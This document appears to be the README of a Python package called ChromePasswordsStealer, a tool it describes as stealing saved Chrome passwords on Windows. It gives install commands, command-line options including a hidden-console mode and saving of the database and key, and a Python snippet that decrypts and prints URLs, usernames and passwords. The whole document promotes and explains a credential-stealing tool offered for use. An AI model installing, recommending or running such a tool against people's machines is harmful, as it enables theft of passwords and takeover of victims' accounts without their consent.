![ChromePasswordsStealer logo](https://mauricelambert.github.io/info/python/security/ChromePasswordsStealer_small.png "ChromePasswordsStealer logo")

# ChromePasswordsStealer

## Description

This module steals chrome passwords on Windows.

## Requirements

This package require:
 - python3
 - python3 Standard Library
 - pywin32
 - PythonToolsKit
 - PyCryptodome

## Installation

```bash
pip install ChromePasswordsStealer
```

## Usages

## Command lines

```bash
# Python executable
python3 ChromePasswordsStealer.pyz -h
# or
chmod u+x ChromePasswordsStealer.pyz
./ChromePasswordsStealer.pyz --help

# Python module
python3 -m ChromePasswordsStealer

# Entry point (console)
ChromeStealer --save-all --window -f passwords
```

### Python script

```python
from ChromePasswordsStealer import ChromePasswordsStealer
stealer = ChromePasswordsStealer()
stealer = ChromePasswordsStealer("passwords", True)
stealer.get_database_cursor()
stealer.get_key()
for url, username, password in stealer.get_credentials():
    print(url, username, password)

stealer.save_and_clean()
```

## Help

```text
~# python3 ChromePasswordsStealer.py -h

usage: ChromePasswordsStealer.py [-h] [--filename FILENAME] [--window] [--save-all]

This program steals Chrome passwords on Windows.

optional arguments:
  -h, --help            show this help message and exit
  --filename FILENAME, -f FILENAME
                        The filename to export the credentials.
  --window, -w          Do not hide the console.
  --save-all, -s        Save chrome db, key file and key.
```

## Links

 - [Github Page](https://github.com/mauricelambert/ChromePasswordsStealer/)
 - [Documentation](https://mauricelambert.github.io/info/python/security/ChromePasswordsStealer.html)
 - [Download as python executable](https://mauricelambert.github.io/info/python/security/ChromePasswordsStealer.pyz)
 - [Pypi package](https://pypi.org/project/ChromePasswordsStealer/)

## Licence

Licensed under the [GPL, version 3](https://www.gnu.org/licenses/).
